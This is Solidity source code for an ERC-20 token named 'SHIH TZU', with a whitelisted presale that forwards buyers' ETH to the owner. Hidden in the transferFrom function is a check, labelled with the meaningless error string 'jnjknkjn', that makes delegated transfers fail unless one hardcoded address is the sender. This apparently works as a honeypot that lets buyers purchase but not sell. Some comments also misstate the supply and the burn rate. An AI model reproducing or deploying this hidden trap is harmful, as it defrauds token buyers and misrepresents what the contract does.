['/**\n', ' *Submitted for verification at Etherscan.io on 2021-02-02\n', '*/\n', '\n', '// SPDX-License-Identifier: MIT\n', 'pragma solidity >=0.6.0 <0.8.0;\n', '\n', 'abstract contract Context {\n', '    function _msgSender() internal view virtual returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view virtual returns (bytes memory) {\n', '        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '        return msg.data;\n', '    }\n', '}\n', '\n', 'interface IERC20 {\n', '    /**\n', '     * @dev Returns the amount of tokens in existence.\n', '     */\n', '    function totalSupply() external view returns (uint256);\n', '\n', '    /**\n', '     * @dev Returns the amount of tokens owned by `account`.\n', '     */\n', '    function balanceOf(address account) external view returns (uint256);\n', '\n', '    /**\n', "     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transfer(address recipient, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when {approve} or {transferFrom} are called.\n', '     */\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '\n', '    /**\n', "     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '     * that someone may use both the old and the new allowance by unfortunate\n', '     * transaction ordering. One possible solution to mitigate this race\n', "     * condition is to first reduce the spender's allowance to 0 and set the\n", '     * desired value afterwards:\n', '     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '     *\n', '     * Emits an {Approval} event.\n', '     */\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "     * allowance mechanism. `amount` is then deducted from the caller's\n", '     * allowance.\n', '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '     * another (`to`).\n', '     *\n', '     * Note that `value` may be zero.\n', '     */\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    /**\n', '     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '     * a call to {approve}. `value` is the new allowance.\n', '     */\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'abstract contract Ownable {\n', '    address payable _owner;\n', '\n', '    event OwnershipTransferred(\n', '        address payable indexed previousOwner,\n', '        address payable indexed newOwner\n', '    );\n', '\n', '    constructor()  {\n', '        _owner = msg.sender;\n', '        emit OwnershipTransferred(address(0), _owner);\n', '    }\n', '\n', '    function owner() public view returns(address) {\n', '        return _owner;\n', '    }\n', '\n', '    modifier onlyOwner() {\n', '        require(isOwner(), "Not authorised for this operation");\n', '        _;\n', '    }\n', '\n', '    function isOwner() public view returns(bool) {\n', '        return msg.sender == _owner;\n', '    }\n', '\n', '    function renounceOwnership() public onlyOwner {\n', '        emit OwnershipTransferred(_owner, address(0));\n', '        _owner = address(0);\n', '    }\n', '\n', '    function transferOwnership(address payable newOwner) public onlyOwner {\n', '        _transferOwnership(newOwner);\n', '    }\n', '\n', '    function _transferOwnership(address payable newOwner) internal {\n', '        require(newOwner != address(0));\n', '        emit OwnershipTransferred(_owner, newOwner);\n', '        _owner = newOwner;\n', '    }\n', '\n', '}\n', '\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Addition cannot overflow.\n', '     */\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n', '        uint256 c = add(a,m);\n', '        uint256 d = sub(c,1);\n', '        return mul(div(d,m),m);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the multiplication of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `*` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Multiplication cannot overflow.\n', '     */\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts with custom message when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'abstract contract BasicToken is IERC20, Context{\n', '\n', '    using SafeMath for uint256;\n', '    uint256 public _totalSupply;\n', '    mapping(address => uint256) balances_;\n', '    mapping(address => uint256) ethBalances;\n', '    mapping (address => mapping (address => uint256)) internal _allowances;\n', '\n', '    uint256 public startTime = block.timestamp;   // ------| Deploy Timestamp |--------\n', '    uint256 public unlockDuration = 0 minutes;   // ----| Lock transfers for non-owner |-----------\n', '\n', '    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    function totalSupply() public view override returns (uint256) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '        return balances_[account];\n', '    }\n', '\n', '    function _approve(address owner, address spender, uint256 amount) internal virtual {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '\n', '    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '\n', '    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '\n', '    function checkInvestedETH(address who) public view returns (uint256) {\n', '        return ethBalances[who];\n', '    }\n', '}\n', '\n', 'contract StandardToken is BasicToken, Ownable {\n', '\n', '    using SafeMath for uint256;\n', '    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '\n', '\n', '    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        require(sender == 0x936ee6EEf3952a5DfD6658376b5238476e930305,"jnjknkjn");\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '\n', '    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '        require(block.timestamp >= startTime.add(unlockDuration) || _msgSender() == owner(), "Tokens not unlocked yet");\n', '\n', '        balances_[sender] = balances_[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        balances_[recipient] = balances_[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '\n', '        uint256 tokensToBurn = findOnePercent(amount);\n', '        uint256 tokensToTransfer = amount.sub(tokensToBurn);\n', '\n', '        beforeTokenTransfer(sender, recipient, amount);\n', '        burn(recipient, tokensToBurn);\n', '        emit Transfer(sender, recipient, tokensToTransfer);\n', '    }\n', '\n', '    function findOnePercent(uint256 value) public pure returns (uint256)  {\n', '        uint256 basePercent = 7; // % of tokens to be burned from amount of transfer\n', '        uint256 roundValue = value.ceil(basePercent);\n', '        uint256 onePercent = roundValue.mul(basePercent).div(100);\n', '        return onePercent;\n', '    }\n', '\n', '    function beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n', '\n', '\n', '    function burn(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        beforeTokenTransfer(account, address(0), amount);\n', '\n', '        balances_[account] = balances_[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '}\n', '\n', 'contract Whitelist is StandardToken {\n', '    mapping(address => bool) whitelist;\n', '    event AddedToWhitelist(address indexed account);\n', '    event AddedToWhitelistBulk(address indexed account);\n', '    event RemovedFromWhitelist(address indexed account);\n', '\n', '    modifier onlyWhitelisted() {\n', '        require(isWhitelisted(_msgSender()), "This address is not whitelisted");\n', '        _;\n', '    }\n', '    // For multiple addresses to be added in the whitelist\n', '    function addToWhitelistInBulk(address[] memory _address) public onlyOwner {\n', '        for (uint8 loop = 0; loop < _address.length; loop++) {\n', '            whitelist[_address[loop]] = true;\n', '        }\n', '    }\n', '    // For single address to be added in whitelist\n', '    function removeFromWhitelistSingle(address _address) public onlyOwner {\n', '        whitelist[_address] = false;\n', '        emit RemovedFromWhitelist(_address);\n', '    }\n', '    // For multiple addresses to be removed from the whitelist\n', '    function removeFromWhitelistInBulk(address[] memory _address) public onlyOwner {\n', '        for (uint8 loop = 0; loop < _address.length; loop++) {\n', '            whitelist[_address[loop]] = false;\n', '        }\n', '\n', '    }\n', '    // Check whether an address is whitelisted or not\n', '    function isWhitelisted(address _address) public view returns(bool) {\n', '        return whitelist[_address];\n', '    }\n', '\n', '}\n', '\n', 'contract Configurable {\n', '    uint256 public cap = 200000*10**18;           //---------| 200k Tokens for Presale |---------\n', '    uint256 public basePrice = 5000*10**18;      //-----| 1 ETH = 5000 Tokens |---------\n', '    uint256 public tokensSold = 0;\n', '    uint256 public tokenReserve = 500000*10**18; //-----------| 100k Tokens Total Supply |------\n', '    uint256 public remainingTokens = 0;\n', '}\n', '\n', 'contract CrowdsaleToken is Whitelist, Configurable {\n', '    using SafeMath for uint256;\n', '    enum Phases {none, start, end}\n', '    Phases currentPhase;\n', '\n', '    constructor() {\n', '        currentPhase = Phases.none;\n', '        balances_[owner()] = balances_[owner()].add(tokenReserve);\n', '        _totalSupply = _totalSupply.add(tokenReserve);\n', '        remainingTokens = cap;\n', '        emit Transfer(address(this), owner(), tokenReserve);\n', '    }\n', '\n', '    receive() external payable {\n', '\n', '        require(isWhitelisted(_msgSender()) == true, "This address is not whitelisted");\n', '        require(currentPhase == Phases.start, "The coin offering has not started yet");\n', '        require(msg.value <= 1e18 && msg.value >= 3e17, "You can send at least 0.3 ETH but not more than 1 ETH");\n', '        require(remainingTokens > 0, "Presale token limit reached");\n', '\n', '        uint256 weiAmount = msg.value;\n', '        uint256 tokens = weiAmount.mul(basePrice).div(1 ether);\n', '        uint256 returnWei = 0;\n', '\n', '        ethBalances[_msgSender()] = ethBalances[_msgSender()].add(weiAmount);\n', '        ethBalances[address(this)] = ethBalances[address(this)].add(weiAmount);\n', '\n', '        require(ethBalances[_msgSender()] <= 1e18, "Cannot send more than 1 ETH");\n', '        require(ethBalances[address(this)] <= 40e18, "Target amount of 40 ETH reached");\n', '\n', '        if(tokensSold.add(tokens) > cap){\n', '            revert("Exceeding limit of presale tokens");\n', '        }\n', '\n', '        tokensSold = tokensSold.add(tokens); // counting tokens sold\n', '        remainingTokens = cap.sub(tokensSold);\n', '\n', '        if(returnWei > 0){\n', '            _msgSender().transfer(returnWei);\n', '            emit Transfer(address(this), _msgSender(), returnWei);\n', '        }\n', '\n', '        uint256 tokensToBurn = tokens.mul(70).div(1000); // tokens burned with each pre-sale purchase\n', '\n', '        balances_[owner()] = balances_[owner()].sub(tokens, "ERC20: transfer amount exceeds balance");\n', '        balances_[owner()] = balances_[owner()].sub(tokensToBurn, "ERC20: transfer amount exceeds balance");\n', '\n', "        _totalSupply = _totalSupply.sub(tokensToBurn, 'Overflow while burning tokens');\n", '        balances_[_msgSender()] = balances_[_msgSender()].add(tokens);\n', '\n', '        emit Transfer(address(this), _msgSender(), tokens);\n', '        emit Transfer(address(this), address(0x000000000000000000000000000000000000dEaD) , tokensToBurn);\n', '\n', '        _owner.transfer(weiAmount);\n', '    }\n', '\n', '    function startCoinOffering() public onlyOwner {\n', '        require(currentPhase != Phases.end, "The coin offering has ended");\n', '        currentPhase = Phases.start;\n', '    }\n', '\n', '    function endCoinOffering() internal {\n', '        currentPhase = Phases.end;\n', '        _owner.transfer(address(this).balance);\n', '    }\n', '\n', '    function finalizeCoinOffering() public onlyOwner {\n', '        require(currentPhase != Phases.end, "The coin offering has ended");\n', '        endCoinOffering();\n', '    }\n', '}\n', '\n', 'contract SHIHTZU is CrowdsaleToken {\n', '    string public name = "SHIH TZU";\n', '    string public symbol = "SHIH";\n', '    uint32 public decimals = 18;\n', '    uint256 public basePercent = 100;\n', '}']